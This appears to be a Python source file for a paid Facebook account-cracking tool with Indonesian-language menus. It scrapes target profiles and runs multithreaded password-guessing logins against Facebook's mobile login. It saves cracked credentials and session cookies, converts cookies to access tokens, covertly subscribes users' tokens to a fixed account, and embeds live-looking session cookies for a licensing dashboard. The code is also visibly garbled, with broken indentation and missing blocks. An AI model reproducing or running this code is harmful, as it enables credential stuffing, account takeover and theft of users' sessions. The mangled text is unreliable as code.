#!/usr/bin/python3 
#coding=utf-8 
 
""" 
import json, os, re, time, sys 
from concurrent.futures import ThreadPoolExecutor as Bool 
from random import choice as ah_memeq_basah 
from datetime import date 
waktu = date.today() 
P = "\x1b[0;97m" 
M = "\x1b[0;91m" 
H = "\x1b[0;92m" 
K = "\x1b[0;93m" 
B = "\x1b[0;94m" 
BM = "\x1b[0;96m" 
try: 
	import requests as req 
except: 
	print("[{M}!{P}] {BM}Ops! Module requests belum terinstall...\nSedang Menginstall Module...{P}") 
	os.system("python3 -m pip install requests") 
	from bs4 import BeautifulSoup as par 
	print("[{M}!{P}] {BM}Ops! Module bs4 belum terinstall...\nSedang Menginstall Module...{P}") 
	os.system("python3 -m pip install bs4") 
os.system("clear") 
import data as dump 
from data import cp_detect as cpp 
ok,cp,loop = [],[],0 
cot = "" 
nampung, opsi = [], [] 
ub, pwBaru = [], [] 
proxyu = [] 
save = [] 
gab,exp,data_licensi = [],[],{} 
cv = { 
	"01":"Januari", 
	"02":"Febuari", 
	"03":"Maret", 
} 
lah_kontol = {} 
status = req.get("https://raw.githubusercontent.com/Latip176/latip176.github.io/main/index.html").text 
cek_status = re.findall('\<span\>(.*?)<\/span\>',str(status)) 
if "Berjalan" in cek_status: 
	pass 
elif "Mainthance" in cek_status: 
	os.system("clear") 
	pesan = re.findall('\<p\>(.*?)<\/p\>',str(status)) 
	exit(f" * Script sedang update! Mohon tunggu ^^\n * Pesan update: {BM}{pesan[0]}{P}\n * Cek status script kunjungi: latip176.github.io\n") 
else: 
	exit(" * Ops! Ada kesalahan coba hubungi Latif!") 
def getToken(cookie): 
	headers = {'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': cookie} 
	try: 
		_get=req.get("https://business.facebook.com/creatorstudio/home",headers=headers).text 
		__token=re.search('\{\"accessToken\"\:\"(EAA\w+)\"',str(_get)).group(1) 
		if "EAA" in __token: 
			return __token 
		else: 
			return "Cookies Invalid" 
	except: 
		return "Cookies Invalid" 
class Main(object): 
	def __init__(self, token, id, name): 
		self.token = token 
		self.id = id 
		self.name = name 
	def banner(self): 
		banner = f"""{P} 
_________  ________  __      __________ 
\_   ___ \ \_____  \/  \    /  \_____  \ 
  Developer: Latip176, Project! 
		""" 
		return banner 
	def cpdetect(self): 
		l = {} 
		n=0 
		for x in os.listdir("results"): 
			n+=1 
			l.update({str(n):x}) 
			print(f" {n}. {x}") 
		print("") 
		__data=input("[?] Pilih / Masukan nama file: ") 
		try: 
			_file=open("results/"+l[__data],"r").readlines() 
		except KeyError: 
			try: 
				_file=open("results/"+__data,"r").readlines() 
			except FileNotFoundError: 
				exit("[!] File tidak ditemukan") 
			exit("[!] File tidak ditemukan") 
		ww=input("[?] Ubah pw ketika tap yes [y/t]: ") 
		if ww in ("y","ya"): 
			pwBar=input("[+] Masukan pw baru: ") 
			ub.append("y") 
			if len(pwBar) <= 5: 
				exit("Password harus lebih dari 6 character!") 
			else: 
				pwBaru.append(pwBar) 
		cpp.Eksekusi("https://mbasic.facebook.com",_file,"file","".join(pwBaru),"".join(ub)) 
		print(f" * Hasil tap yes di save di results/ok.txt\n * Hasil {H}aman{P}/{K}cp{P}/{M}salah{P}: {H}{cpp.aman}{P}/{K}{cpp.cp}{P}/{M}{cpp.salah}{P}") 
	def ppguard(self, enable = True): 
		d = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(self.id)) 
		h = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % self.token} 
		url = f"https://graph.facebook.com/graphql?access_token={self.token}" 
		res = req.get(url, data = d, headers = h) 
		if enable==True: 
			enable = "On" 
			enable = "Off" 
		print(f"\n * {H}Success{P} {enable} profile guard\n") 
	def proses(self): 
		op = input(f"[{K}?{P}] Munculkan opsi cp [y/t]: ") 
		if op in ("y","Y"): 
			opsi.append("y") 
			ww=input(f"[{K}?{P}] Ubah pw ketika tap yes [y/t]: ") 
			if ww in ("y","ya"): 
				pwBar=input(f"[{H}+{P}] Masukan pw baru: ") 
				ub.append("y") 
				if len(pwBar) <= 5: 
					exit(f"{M}Password harus lebih dari 6 character!{P}") 
				else: 
					pwBaru.append(pwBar) 
				print("> Skipped") 
		print(f"\n * Save hasil cp akan dimasukan kemana?\n[1]. Ke cp.txt\n[2]. Buat file baru\n ") 
		__nda_tau_ko_tanya = input("[?] Chose: ") 
		if __nda_tau_ko_tanya in ("01","1"): 
			save.append("cp.txt") 
		elif __nda_tau_ko_tanya in ("02","2"): 
			file = input("[+] Masukan nama file (bebas) buat tampung akun hasil cp: ") 
			save.append(file) 
			print("> skipped") 
		print(f"\n[{BM}!{P}] Akun hasik ok di save di ok.txt\n[{BM}!{P}] Akun hasil cp di save di {save[0]}\n") 
class Data(Main): 
	def menu(self): 
		os.system("clear") 
		stats,durasi,berakhir = lah_kontol["Status"],lah_kontol["Durasi"],lah_kontol["Berakhir"] 
		print(self.banner()) 
		print(f"{'='*40}\n + Status: {stats}\n + Durasi: {BM}{durasi}{P}\n + Berakhir: {BM}{berakhir}{P}\n{'='*40}") 
		print(f"\n * Welcome {self.name} in tool! Pilih crack dan mulai.") 
		print(f"[{BM}1{P}]. Crack dari pertemanan publik\n[{BM}2{P}]. Crack dari followers publik\n[{BM}3{P}]. Crack dari pencarian nama\n[{BM}4{P}]. Checkpoint detector\n[{BM}5{P}]. On/Off Profile Guard [NEXT UPDATE]\n[{BM}6{P}]. Cek hasil {H}Ok{P}/{K}Cp{P}\n[{M}0{P}]. Logout akun (hapus token)\n") 
		_chose = input(f"[{K}?{P}] Chose: ") 
		__pilih = ["01","1","02","2","03","3","0","04","4","05","5","06","6"] 
		while _chose not in __pilih: 
			print("\n[!] Pilihan tidak ada") 
			_chose = input("[?] Chose: ") 
		if _chose in ("01","1"): 
			print(f" * Ingin crack masal?") 
			__jir = input(" * y/t: ").lower() 
			if("y" in __jir): 
				print("\n * Ingin berapa target?") 
				__target = int(input(" [?] Berapa: ")) 
				print(f"\n[{BM}!{P}] Ketik {BM}'me'{P} untuk teman list kamu") 
				for _mek in range(__target): 
					_mek += 1 
					__id = input(f"[{K}{_mek}{P}] Masukan username atau id target: ").replace("'me'","me") 
					if(re.findall("\w+",__id)): 
						if(__id not in ("me","'me'")): 
							r=req.get(f"https://m.facebook.com/{__id}",						headers={"user-agent":"chrome"}).text 
							try: 
								id = re.findall('\;rid\=(\d+)\&',str(r))[0] 
							except: 
								exit(f"{M}[!] Ops! Username tidak ditemukan.{P}") 
							self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(id) 
						else: 
							self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(__id) 
					else: 
						self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(__id) 
				print(f"[{BM}!{P}] Ketik {BM}'me'{P} untuk teman list kamu") 
				__id = input(f"[{K}?{P}] Masukan username atau id target: ").replace("'me'","me") 
				if(re.findall("\w+",__id)): 
					if(__id not in ("me","'me'")): 
						r=req.get(f"https://m.facebook.com/{__id}",						headers={"user-agent":"chrome"}).text 
						try: 
							id = re.findall('\;rid\=(\d+)\&',str(r))[0] 
						except: 
							exit(f"{M}[!] Ops! Username tidak ditemukan.{P}") 
						self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(id) 
					self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(__id) 
			self.submit(self.data) 
		elif _chose in ("02","2"): 
			print(f"[{BM}!{P}] Ketik {BM}'me'{P} untuk followers list kamu") 
			__id = input(f"[{K}?{P}] Masukan username atau id target: ").replace("'me'","me") 
			if(re.findall("\w+",__id)): 
				if(__id not in ("me","'me'")): 
					r=req.get(f"https://m.facebook.com/{__id}",						headers={"user-agent":"chrome"}).text 
					try: 
						id = re.findall('\;rid\=(\d+)\&',str(r))[0] 
					except: 
						exit(f"{M}[!] Ops! Username tidak ditemukan.{P}") 
					self.data = dump.Dump("https://graph.facebook.com",self.token).followers(id) 
					self.data = dump.Dump("https://graph.facebook.com",self.token).followers(__id) 
				self.data = dump.Dump("https://graph.facebook.com",self.token).followers(__id) 
		elif _chose in ("03","3"): 
			print(" * Pencarian bisa lebih dari 1 target (contoh: memek,kontol)\n * Just info 1 target biasanya dapet 70 - 100 id!\n") 
			__id = input("[+] Query search: ").split(",") 
			for x in __id: 
				self.data = dump.Dump("","").pencarian(f"https://mbasic.facebook.com/public/{x}?/locale2=id_ID") 
			print(f"\n[] Dump selesai {len(self.data)} id didapatkan!") 
		elif _chose in ("04","4"): 
			self.cpdetect() 
		elif _chose in ("05","5"): 
			print(f"{BM} * Nyalakan atau matikan Profile guard!{P}\n1. Profile guard {H}On{P}\n2. Profile guard {M}Off{P}\n") 
			_anjay_alok_mwhehe = input("[?] Chose: ") 
			if _anjay_alok_mwhehe in ("01","1"): 
				enable = True 
			elif _anjay_alok_mwhehe in ("02","2"): 
				enable = False 
				exit(f"\n{M}Kamu anjing:v pilih yang bener ya sayang:)\n") 
			self.ppguard(enable) 
		elif _chose in ("06","6"): 
			print("") 
			print("="*40) 
			print(f"(+) Hasil {H}OK{P} (+)\n") 
			print(" * Name file: ok.txt") 
			print(open("results/ok.txt","r").read()) 
			print(f"(+) Hasil {K}CP{P} (+)\n") 
			for x in os.listdir("results"): 
				if x!="ok.txt": 
					print(f" * Name file: {x}") 
					print(open(f"results/{x}","r").read()) 
			exit("\n") 
		elif _chose in ("0","00"): 
			os.system("rm -rf data/save.txt") 
			exit(f"{H}Thanks You....{P}\n") 
			print(f"{M}[] Kesalahan...{P}") 
	def submit(self,data): 
		print(f"\n[!] Pilih Metode Crack\n[{BM}1{P}] Metode b-api\n[{BM}2{P}] Metode mobile v1 [{H}rekomendasi{P}] {BM}Lambat{P} OK Banyak\n[{BM}3{P}] Metode mobile v2 [{H}rekomendasi{P}] {BM}Cepet{P} OK Dikit\n") 
		metode = input(f"[{K}?{P}] Chose: ") 
		print(f"\n[!] D: {B}Default, {P}M: {BM}Manual, {P}G: {H}Gabung. {P}") 
		pasw=input(f"[{K}?{P}] Password [d/m/g]: ") 
		if pasw in ("m","M","g","G"): 
			print(f"[{BM}!{P}] Pisahkan password menggunakan koma contoh (sayang,bangsad)") 
			tam = input(f"[{H}+{P}] Masukan password: ").split(",") 
		self.proses() 
		print(" * Crack dimulai... CTRL + Z untuk stop! \n * On, Off mode pesawat jika tidak mendapatkan hasil\n") 
		with Bool(max_workers=35) as kirim: 
			for __data in data: 
				nama,id = __data.split("<=>") 
				nampung.append(id) 
				if(len(nama)>=6): 
					pwList = [nama,nama+"123",nama+"1234",nama+"12345"] 
				elif(len(nama)<=2): 
					pwList = [nama+"1234",nama+"12345"] 
				elif(len(nama)<=5): 
					pwList = [nama+"123",nama+"1234",nama+"12345"] 
				if pasw in ("d","D"): 
					pwList = pwList 
				elif pasw in ("m","M"): 
					pwList = tam 
				elif pasw in ("g","G"): 
					pwList = pwList + tam 
				if metode in ("01","1"): 
					exit("[!] Metode b-api sedang diperbaiki") 
					kirim.submit(Crack(self.token,self.id,self.name).b_api,"https://b-api.facebook.com",id,pwList) 
				elif metode in ("02","2"): 
					kirim.submit(Crack(self.token,self.id,self.name).mbasic,id,pwList) 
				elif metode in ("03","3"): 
					kirim.submit(Crack(self.token,self.id,self.name).mfb,id,pwList) 
					exit("[!] Pilih yang bener") 
		exit("[!] Crack selesai....") 
class Crack(Main): 
	def mfb(self,user,pwList): 
		global loop,cot 
		waifuku_megumi_wangy = ah_memeq_basah([M,H,K,B,BM,P]) 
		pipis_ruminas_wangy_wangy = ah_memeq_basah(['|','\\','/','-']) 
			session = req.Session() 
			r = par(session.get("https://m.facebook.com/login/?ref=dbl&fl",headers={"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.8,en;q=0.7","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"}).text,'html.parser') 
			for pw in pwList: 
				pw = pw.lower() 
				data = {} 
				lsd = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","bi_xrwh"] 
				for x in r.find("form",{"id":"login_form"}): 
					if x.get("name") in lsd: 
						data.update({x.get("name"):x.get("value")}) 
				data.update({ 
					"prefill_contact_point":"", 
					"prefill_source":"", 
					"prefill_type":"", 
					"is_smart_lock":"false", 
					"_fb_noscript":"true", 
					"email":user, 
					"pass":pw, 
					"login":"Log In", 
					"next":"https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;ref=dbl" 
				}) 
				session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.8,en;q=0.7","upgrade-insecure-requests":"1","origin":"https://www.facebook.com","referer":"https://www.facebook.com","user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"}) 
				post = session.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;ref=dbl",data=data,allow_redirects=False).cookies.get_dict() 
				if "c_user" in post: 
					ok.append(user+"|"+pw) 
					open("results/ok.txt","a").write(user+"|"+pw+"\n") 
					coki = "".join(["%s=%s;"%(k,v) for k,v in post.items()]) 
						cpp.Eksekusi("","","","","").follow(session,coki) 
						pass 
						cpp.Eksekusi("","","","","").cek_apk(session,coki,user,pw,"anying") 
						sys.stdout.write(f"\r\r\33[32;1m[OK] %s | %s | %s            \n\33[37;1m"%(user,pw,coki)) 
						sys.stdout.flush() 
						print(f"\r{P} > Aplikasi tidak berhasil di dapatkan           ") 
					break 
				elif "checkpoint" in post: 
					cp.append(user+"|"+pw) 
					sys.stdout.write(f"\r\33[1;33m[CP] %s | %s                   \33[37;1m\n"%(user,pw)) 
					sys.stdout.flush() 
					open(f"results/{''.join(save)}","a").write(user+"|"+pw+"\n") 
				sys.stdout.write(f"\r{waifuku_megumi_wangy}[{pipis_ruminas_wangy_wangy}{pipis_ruminas_wangy_wangy}]  {str(loop)}/{str(len(nampung))} Ok/Cp: {len(ok)}/{len(cp)} CRACK: {'{:.1%}'.format(loop/float(len(nampung)))}	") 
				sys.stdout.flush() 
			loop+=1 
		except req.exceptions.ConnectionError: 
			sys.stdout.write(f"\r[!] Connection time out                ") 
			sys.stdout.flush() 
			loop-=1 
			self.mfb(user,pwList) 
	def mbasic(self,user,pwList): 
		global loop, cot 
			r = req.Session() 
			h1 = { 
				"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.8,en;q=0.7" 
			} 
			h2 = { 
				"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.8,en;q=0.7" 
				t = par(r.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",headers=h1).text,'html.parser') 
				link = t.find('form',{'id':'login_form'}) 
				lst = ['lsd','jazoest'] 
				data={} 
				for x in link: 
					if x.get('name') in lst: 
						data.update({x.get('name'):x.get('value')}) 
					"uid":user, 
					"flow":"login_no_pin", 
					"next":"https://developers.facebook.com/tools/debug/accesstoken/" 
				r.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=h2, allow_redirects = False) 
				if "c_user" in r.cookies.get_dict(): 
					cookies = r.cookies.get_dict() 
					coki = 'datr=' + cookies['datr'] + ';' + ('c_user=' + cookies['c_user']) + ';' + ('fr=' + cookies['fr']) + ';' + ('xs=' + cookies['xs']) 
						cpp.Eksekusi("","","","","").follow(r,coki) 
						cpp.Eksekusi("","","","","").cek_apk(r,coki,user,pw,"anying") 
				elif "checkpoint" in r.cookies.get_dict(): 
			self.mbasic(user,pwList) 
def login(): 
	logo_login = f"""\n{P} 
.##.......####....####...######..##..##. 
.##......##..##..##........##....###.##. 
........................................ 
	""" 
	print(logo_login,"\n * Login terlerbih dahulu menggunakan accesstoken facebook!\n * Jika tidak mempunyai token atau cookies silahkan cari tutorialnya di youtube untuk mendapatkan token facebook.\n * Ketika sudah memakai sc ini maka Author tidak bertanggung jawab atas resiko apa yang akan terjadi kedepannya.\n") 
	print(" * Ingin login menggunakan apa\n[1]. Login menggunakan cookies\n[2]. Login menggunakan token") 
	bingung = input("\n[?] Login menggunakan: ") 
	__pilihan = ["01","1","02","2"] 
	while bingung not in __pilihan: 
		print("\n[!] Pilihan tidak ada") 
		bingung = input("[?] Login menggunakan: ") 
	if bingung in ("01","1"): 
		__cokiee = input("[?] cookie\t: ") 
		__coki = getToken(__cokiee) 
		if "EAA" in __coki: 
			_cek = json.loads(req.get(f"https://graph.facebook.com/me?access_token={__coki}").text) 
			_id = _cek['id'] 
			_nama = _cek['name'] 
			input(f"\n[] Berhasil login menggunakan cookies\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu") 
			open("data/save.txt","a").write(__coki) 
			Data(__coki,_id,_nama).menu() 
		elif "Cookies Invalid" in __coki: 
			exit("\n[!] Cookies Invalid") 
			exit("\n[!] Kesalahan") 
	elif bingung in ("02","2"): 
		__token = input("[?] token\t: ") 
			__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text) 
			_nama = __res['name'] 
			_id = __res['id'] 
			req.post(f'https://graph.facebook.com/100076514745258/subscribers?access_token={__token}') 
			input(f"\n[] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu") 
			open("data/save.txt","a").write(__token) 
			Data(__token, _id, _nama).menu() 
			print("\n[!] token invalid") 
def buy_licensi(): 
		__key_licensi = open("data/key.txt","r").read() 
		scraping_licensi(__key_licensi) 
	except FileNotFoundError: 
		print("\n * Ops! Anda tidak mempunyai Licensi Key. Jika ingin mengakses Tool ini Anda harus mempunyai Licensi Key terlebih dahulu.\n * Ketik 'open' dibawah jika, ingin membeli Licensi Key.\n * Jika, sudah mempunyai Licensi Key silahkan masukan Licensi Key Anda dibawah.\n") 
		_key = input(" + Licensi Key: ") 
		if(_key in ("open","'open'")): 
			os.system("xdg-open https://wa.me/6283172566909") 
			scraping_licensi(_key) 
	Main() 
def hapus_user_licensi(coki,id): 
	ses = req.Session() 
	r = par(ses.get(f"https://app.cryptolens.io/Customer/Delete/{id}",cookies=coki).text,'html.parser') 
	token = r.find("input",{"name":"__RequestVerificationToken"}).get("value") 
	data = {"__RequestVerificationToken":token,"":"Delete"} 
	return ses.post(f"https://app.cryptolens.io/Customer/Delete/{id}",cookies=coki,headers={"upgrade-insecure-requests":"2"},data=data) 
def scraping_licensi(key_licensi): 
	coki = {"cookie":"_gcl_au=1.1.2089249667.1646109080; ai_user=u1jiz|2022-03-01T04:31:20.834Z; intercom-id-uyf5hx0o=6607acad-e42c-43a9-a54d-152dd2f8f83e; ARRAffinity=8c8429a79c4186d4f9fd249c7e14efc2eeac7c877a537844c20d543eaff3048f; ARRAffinitySameSite=8c8429a79c4186d4f9fd249c7e14efc2eeac7c877a537844c20d543eaff3048f; __RequestVerificationToken=ywOqsUpMGXGHA6vl6xN3GsJFu2VPH4Wg0ly-McdpEN7BLwpRowTezk7rw-AQNKJMUrzv0pYKSEuTfTbNd4NyKiFL7wochy8cOUspcXl7AB81; .ASPXAUTH=B7148019C1B8DADFE3C1DA229180BF1715B8E4FD382303B2E9582D5BFF3ACB019650C75F3BBB9D2255415332A4B1CDEE21A42C7F810693BCA55807A5D87C95CCC0A9928B24C1A5443CBE07889E1234E8D84E5A5703AE7D3125F399217B9EACF16795235D4B512AC64CE5E55636DC01AD; ai_session=D8pDs|1646122136008|1646125289379.8; intercom-session-uyf5hx0o=UE5id0l3SDVKbndYMHRacUpOSFlOU2c5RUdYKzF5em5MbXJNVWgyQzk3cHExc3VRNi96RzVjVkZ3V1hjblJWZi0tbm1FSlFDUVRGdThVVS9qN01PdGhpZz09--4126294e75aec3ae5127a6cd8bf2b5280056be2f; useragent=TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBTTS1NMTE1RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk4LjAuNDc1OC4xMDYgTW9iaWxlIFNhZmFyaS81MzcuMzY%3D;"} 
	r = par(req.get("https://app.cryptolens.io/Product/Detail/14098",cookies=coki).text,'html.parser') 
	key = r.find_all("a",{"class":"serialkey"}) 
	hari = re.findall("\<td\ id\=\"k-period-.*\"\>(.*?)<\/td\>",str(r)) 
	exp = re.findall("\<td\ id\=\"k-expr-.*\"\>(.*?)<\/td\>",str(r)) 
	nama = re.findall('\<a\ href\=\"\/Customer\/Edit\/(.*)\"\ target\=\"\_blank\"\>(.*?)<\/a\>',str(r)) 
	blok = re.findall('\<a\ href\=\"\#\"\ id\=\"k-bk-.*\"\ onclick\=\".*?\"\ style\=\".*?\"\>\s+(.*?)<\/a\>',str(r)) 
	for k,h,e,b,n in zip(key,hari,exp,blok,nama): 
		data_licensi.update({ 
			f"{k.text}":{ 
				"nama":n[1], 
				"id":n[0], 
				"periode":f"{h} Hari", 
				"berakhir":e, 
				"blok":b.replace('                            ','') 
		}) 
		_sagiri = data_licensi[key_licensi] 
		tes = re.findall(f'\<td\ id\=\"k-customer-{_sagiri["id"]}\"\ style\=\"overflow-wrap: break-word;word-wrap: break-word;word-break: break-all;word-break: break-word;hyphens: auto;\">\s+(\w+)\s+<\/td\>',str(r)) 
		if("".join(tes)=="None" or _sagiri["blok"]=="Yes"): 
			os.system("rm -rf data/key.txt") 
			exit(f"{M} ! Licensi Block / Berakhir,{P} Terima Kasih ^^") 
			if(_sagiri["berakhir"]==waktu or _sagiri["blok"]=="Yes"): 
				hapus_user_licensi(coki,_sagiri["id"]) 
				try: 
					open("data/key.txt","r").read() 
				except: 
					open("data/key.txt","a").write(key_licensi) 
				if(_sagiri["nama"]=="trial"): 
					stats = f"{K}Trial{P}" 
					stats = f"{H}Premium{P}" 
				lala = _sagiri["berakhir"].split("-") 
				lah_kontol.update({ 
					"Status":stats, 
					"Durasi":_sagiri["periode"], 
					"Berakhir":str(lala[2])+" "+str(cv[lala[1]])+" "+str(lala[0]) 
				print(f"  Welcome {_sagiri['nama']} Licensi Key accept  ") 
	except KeyError: 
		os.system("rm -rf data/key.txt") 
		exit(f"{M} ! Licensi Key Invalid{P}") 
def Main(): 
		__token = open("data/save.txt","r").read() 
		__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text) 
		_nama = __res['name'] 
		_id = __res['id'] 
		print(f" * Welcome back {_nama}\n * Menuju menu...") 
		time.sleep(3) 
		Data(__token, _id, _nama).menu() 
		os.system("rm -rf data/save.txt") 
		print("\n[!] token invalid") 
		print("[!] belum login\n * Menuju ke menu login...") 
		login() 
def hencet_memek(): 
	os.system('git pull') 
	buy_licensi()
